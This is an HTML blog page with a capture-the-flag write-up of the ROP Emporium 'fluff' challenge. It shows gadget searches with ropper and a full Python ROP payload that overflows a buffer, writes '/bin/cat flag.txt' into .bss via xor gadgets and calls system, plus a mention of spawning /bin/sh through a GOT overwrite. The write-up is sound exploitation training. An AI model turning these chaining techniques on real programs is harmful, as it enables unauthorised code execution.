@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>06_fluff</title><!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="06_fluff" />
+<meta name="author" content="silma" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="ROP Emporium fluff" />
+<meta property="og:description" content="ROP Emporium fluff" />
+<link rel="canonical" href="http://localhost:4000/series/rop_emporium/ropemporium-fluff/" />
+<meta property="og:url" content="http://localhost:4000/series/rop_emporium/ropemporium-fluff/" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-04-24T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/series/rop_emporium/ropemporium-fluff/"},"url":"http://localhost:4000/series/rop_emporium/ropemporium-fluff/","headline":"06_fluff","dateModified":"2020-04-24T00:00:00+02:00","datePublished":"2020-04-24T00:00:00+02:00","description":"ROP Emporium fluff","author":{"@type":"Person","name":"silma"},"@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">/</a></li><li><a href="/writeups.html">writeups</a></li><li><a href="/series.html">series</a></li><li><a href="/cheatsheets.html">cheatsheets</a></li><li><a href="/about.html">about</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="rop-emporium-fluff">ROP Emporium fluff</h1>
+<p><br /></p>
+
+<p><strong>Tools:</strong> IDA Free 7.0, gdb-gef, ropper, readelf
+<strong>Prerequistes:</strong> Stack frame
+<strong>Download solution:</strong> <a href="/assets/series/rop_emporium/main.py">main.py</a></p>
+
+<h2 id="overview">Overview</h2>
+
+<blockquote>
+  <p>“The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done.”</p>
+</blockquote>
+
+<p>This one has funky <em>xor</em> gadgets, but it’s still possible to write where we want.</p>
+
+<h2 id="fails">#Fails</h2>
+<p>Dear diary,
+today I had a lot of fun but also experimented some frustration. I tried several things that didn’ work, but in the end I got the flag. It stated with an idea like this: 
+because <em>_fgets()</em> returns a pointer to the input buffer, I tried to write “<em>/bin/sh</em>” on the stack and then to overwrite the .got.plt entry of <em>_memset()</em> with the address of <em>_system()</em>, and finally to return to <em>mov rdi, rax; call _memset()</em>. I seemed to work (at least according to <em>ps</em>, and <em>gdb</em> indicated the creation of a child process), but I was unable to use this new shell. I tried a second time, replacing <em>“/bin/sh”</em> by “<em>/bin/cat flag.txt</em>”, but was unable to get the output. In addition, overwritting the <em>.got.plt</em> entry of <em>_memset()</em> with the one of <em>_system()</em> generated a Bus error. I still have to figure out why things went this way, but in the end I opted for an easier solution which is basically the <a href="/series/rop_emporium/ropemporium-write4">write4</a> challenge with <em>xor</em>.
+Also, this is the first challenge for which returning to instruction <em>call system</em> majestically failed to execute the commandline pointed by <em>edi</em>; the fix was to return to <em>plt.system</em>.</p>
+
+<h2 id="function-pwnme">Function <em>pwnme()</em></h2>
+
+<p>The function <em>pwnme()</em> calls <em>_fgets()</em>, and <em>_fgets()</em> accepts up to 0x220 input bytes:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x00000000004007EC</span>    <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nb">cs</span><span class="p">:</span><span class="nv">stdin@@GLIBC_2_2_5</span> <span class="c1">; stream</span>
+<span class="err">0</span><span class="nf">x00000000004007F3</span>    <span class="nv">lea</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">s</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x00000000004007F7</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mh">200h</span>       <span class="c1">; n</span>
+<span class="err">0</span><span class="nf">x00000000004007FC</span>    <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; s</span>
+<span class="err">0</span><span class="nf">x00000000004007FF</span>    <span class="nv">call</span>    <span class="nv">_fgets</span>
+</code></pre></div></div>
+
+<h2 id="function-usefulfunction">Function <em>usefulFunction()</em>:</h2>
+
+<p>This function calls <em>_system()</em> with <em>edi</em> pointing to the string <em>“/bin/ls”</em>:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x000000000040080B</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nv">offset</span> <span class="nv">command</span> <span class="c1">; "/bin/ls"</span>
+<span class="err">0</span><span class="nf">x0000000000400810</span>    <span class="nv">call</span>    <span class="nv">_system</span>
+</code></pre></div></div>
+
+<h2 id="writeable-area">Writeable area</h2>
+
+<p>Let’s stick with the <em>.bss</em> section, 0x30 bytes is large enough to contains the string “<em>/bin/cat flag.txt</em>”:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf <span class="nt">--sections</span> fluff
+There are 31 section headers, starting at offset 0x1bf8:
+
+Section Headers:
+<span class="o">[</span>Nr] Name              Type             Address           Offset
+     Size              EntSize          Flags  Link  Info  Align
+<span class="o">[</span>...]
+<span class="o">[</span>26] .bss              NOBITS           0000000000601060  00001060
+     0000000000000030  0000000000000000  WA       0     0     32
+<span class="o">[</span>...]
+</code></pre></div></div>
+
+<h2 id="searching-gadgets">Searching gadgets</h2>
+
+<p>We find a memory write gadget:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper <span class="nt">--search</span> <span class="s2">"mov [%]"</span> <span class="nt">-f</span> ../challs/fluff
+
+0x000000000040084e: mov qword ptr <span class="o">[</span>r10], r11<span class="p">;</span> pop r13<span class="p">;</span> pop r12<span class="p">;</span> xor byte ptr <span class="o">[</span>r10], r12b<span class="p">;</span> ret<span class="p">;</span>
+</code></pre></div></div>
+<p>Okay, <em>mov qword ptr [r10], r11</em> is cool if:</p>
+<ol>
+  <li>We can control <em>r10</em>;</li>
+  <li>we can control <em>r11</em>.</li>
+</ol>
+
+<p>But before that, note the <em>xor [r10], r12b</em>: it writes to memory, but if we set <em>r12b</em> to 0 (thanks to the <em>pop r12</em>), the data at <em>[r10]</em> won’t change. This also means we could chain the pop/xor/ret to decode or restore altered data, similarly to the <a href="/series/rop_emporium/ropemporium-badchars">badchars</a> challenge.<br />
+Now, let’s look for <em>r10</em>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper <span class="nt">--search</span> <span class="s2">"% r10"</span> <span class="nt">-f</span> ../challs/fluff
+<span class="o">[</span>...]
+0x0000000000400840: xchg r11, r10<span class="p">;</span> pop r15<span class="p">;</span> mov r11d, 0x602050<span class="p">;</span> ret<span class="p">;</span> 
+</code></pre></div></div>
+<p>A nice <em>xchg r11, r10</em>. In addition, we note that using this gadget will also execute the instruction <em>mov r11d, 0x602050</em>. So, at this point we can control <em>r10</em> through <em>r11</em>, but we don’t fully control <em>r11</em>. Can we have a better control on it? Let’s check:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper <span class="nt">--search</span> <span class="s2">"% r11"</span> <span class="nt">-f</span> ../challs/fluff
+<span class="o">[</span>...]
+0x0000000000400822: xor r11, r11<span class="p">;</span> pop r14<span class="p">;</span> mov edi, 0x601050<span class="p">;</span> ret<span class="p">;</span> 
+0x000000000040082f: xor r11, r12<span class="p">;</span> pop r12<span class="p">;</span> mov r13d, 0x604060<span class="p">;</span> ret<span class="p">;</span> 
+</code></pre></div></div>
+<p>Hm. The <em>xor r11, r12</em> adds another level of dependency, but the <em>pop r12</em> allows to control the full chain.<br />
+In a nushell:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; set r10 = pointer</span>
+<span class="nf">mov</span> <span class="nb">r11d</span><span class="p">,</span> <span class="mh">0x602050</span>  <span class="c1">; hardcoded constraint</span>
+<span class="nf">pop</span> <span class="nv">r12</span>             <span class="c1">; anything we want</span>
+<span class="nf">xor</span> <span class="nv">r11</span><span class="p">,</span> <span class="nv">r12</span>        <span class="c1">; full control on r11</span>
+<span class="nf">xchg</span> <span class="nv">r11</span><span class="p">,</span> <span class="nv">r10</span>       <span class="c1">; full control on r10</span>
+<span class="c1">; write to [r10]</span>
+<span class="nf">mov</span> <span class="nb">r11d</span><span class="p">,</span> <span class="mh">0x602050</span>  <span class="c1">; hardcoded constrain</span>
+<span class="nf">pop</span> <span class="nv">r12</span>             <span class="c1">; anything we want</span>
+<span class="nf">xor</span> <span class="nv">r11</span><span class="p">,</span> <span class="nv">r12</span>        <span class="c1">; thus, also anything we want</span>
+<span class="nf">mov</span> <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">r10</span><span class="p">],</span> <span class="nv">r11</span> <span class="c1">; full control on [r10]</span>
+</code></pre></div></div>
+<p>Finally, we need a gadget to set <em>edi</em> to points to the commandline to execute:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper <span class="nt">--search</span> <span class="s2">"pop ?di"</span> <span class="nt">-f</span> fluff
+<span class="o">[</span>...]
+0x00000000004008c3: pop rdi<span class="p">;</span> ret<span class="p">;</span> 
+</code></pre></div></div>
+
+<h2 id="rop-the-things">ROP the things</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Fill buffer
+</span><span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x42\x42\x42\x42\x42\x42\x42\x42</span><span class="s">'</span>
+
+<span class="c1"># Round 1
+# set r10 = 0x00601060 (.bss)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x45\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># mov r11, 602050; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x32\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r12; mov r13, junk; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x30\x30\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xorkey = 0x3030; (0x602050^0x3030=0x601060)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x2f\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor r11, r12; pop r12; mov r13,junk;ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x7f\x42\x09\x6e\x2f\x63\x61\x74</span><span class="s">'</span>  <span class="c1"># xorkey 2 (tac/nib/ ^ 602050)
+#payload += b'\x7f\x42\x09\x6e\x2f\x73\x68\x00'  # xorkey 2 (\x00hs/nib/ ^ 602050)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xchg r10, r11; pop r15; mov r11, 602050; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'junk1234'</span>
+<span class="c1"># set r11="/bin/cat"
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x2f\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor r11, r12; pop r12; mov r13,junk; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'junk5678'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x4e\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># mov [r10], r11; pop r13; pop r12; xor [r10], r12b; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'junk9abc'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># neutralize the xor r12b
+</span>
+<span class="c1"># Round 2
+# set r10 = .bss+8
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x45\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># mov r11, 602050; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x32\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r12; mov r13, junk; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x38\x30\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xorkey = 0x3030; (0x602050^0x3030=0x601060)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x2f\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor r11, r12; pop r12; mov r13,junk; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x70\x46\x0c\x61\x67\x2e\x74\x78</span><span class="s">'</span>  <span class="c1"># xorkey 2 ("xt.galf " ^ 602050)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xchg r10, r11; pop r15; mov r11, 602050; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'junk1234'</span>
+<span class="c1"># set r11=" flag.tx"
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x2f\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor r11, r12; pop r12; mov r13,junk; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'junk5678'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x4e\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># mov [r10], r11; pop r13; pop r12; xor [r10], r12b; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'junk9abc'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># neutralize the xor r12b
+</span>
+<span class="c1"># Round 3
+# set r10 = .bss+0x10
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x45\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># mov r11, 602050; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x32\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r12; mov r13, junk; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x20\x30\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xorkey = 0x3030; (0x602050^0x3030=0x601060)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x2f\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor r11, r12; pop r12; mov r13,junk; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x24\x20\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xorkey 2 (t ^ 602050)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x40\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xchg r10, r11; pop r15; mov r11, 602050; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'junk1234'</span>
+<span class="c1"># set r11="t\x00"
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x2f\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># xor r11, r12; pop r12; mov r13, junk; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'junk5678'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x4e\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># mov [r10], r11; pop r13; pop r12; xor [r10], r12b, ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'junk9abc'</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># neutralize the xor r12b
+</span>
+<span class="c1"># call system
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xc3\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop edi; ret
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x60\x10\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># -&gt;"/bin/cat flag.txt"
+#payload += b'\x10\x08\x40\x00\x00\x00\x00\x00'  # call _system(): fails but dunno why
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xe0\x05\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># plt.system
+</span></code></pre></div></div>
+<hr />
+<p>End of file</p>
+
+
+
+    </main><footer>
+  
+</footer>
+</div>
+  </body>
+</html>
